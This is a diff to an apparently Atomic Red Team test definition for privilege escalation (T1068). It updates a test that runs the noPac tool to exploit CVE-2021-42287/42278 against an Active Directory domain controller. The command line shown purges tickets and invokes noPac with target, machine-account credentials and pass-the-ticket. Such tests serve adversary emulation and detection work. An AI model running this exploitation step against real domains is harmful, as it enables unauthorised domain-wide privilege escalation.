@@ -1,10 +1,10 @@
 attack_technique: T1068
 display_name: 'Exploitation for Privilege Escalation'
 atomic_tests:
-- name: noPac
+- name: SAM Name impersonation (noPac tool)
   auto_generated_guid: 233d0587-b3d0-416c-84b1-c0b38bce0d01
   description: |
-    This module runs the Windows executable of noPac in order to exploit CVE-2021-42287/CVE-2021-42278 to elevate privileges on the AD domain.
+    This module runs the Windows executable of noPac (https://github.com/cube0x0/noPac) in order to exploit CVE-2021-42287/CVE-2021-42278 to elevate privileges on the AD domain.
   supported_platforms:
   - windows
   input_arguments:
@@ -51,11 +51,11 @@ atomic_tests:
       # If everything goes well
       exit 0
     get_prereq_command: |
-      Write-Host "1. This computer must be manually added to the targeted domain"
-      Write-Host "2. The binary for noPac must be compiled from the source (the executable is not provided on GitHub)"
+      Write-Host "1. This computer must be manually joined to the targeted domain"
+      Write-Host "2. The binary for noPac must be compiled from the source (the executable is not provided on GitHub: https://github.com/cube0x0/noPac)"
   executor:
-    name: powershell
+    name: command_prompt
     elevation_required: false
     command: |
       klist purge
-      & "#{nopac_path}" /dc "#{target_dc}" /mAccount "#{computer_account}" /mPassword "#{computer_password}" /service "#{service}" /ptt
+      "#{nopac_path}" /dc "#{target_dc}" /mAccount "#{computer_account}" /mPassword "#{computer_password}" /service "#{service}" /ptt
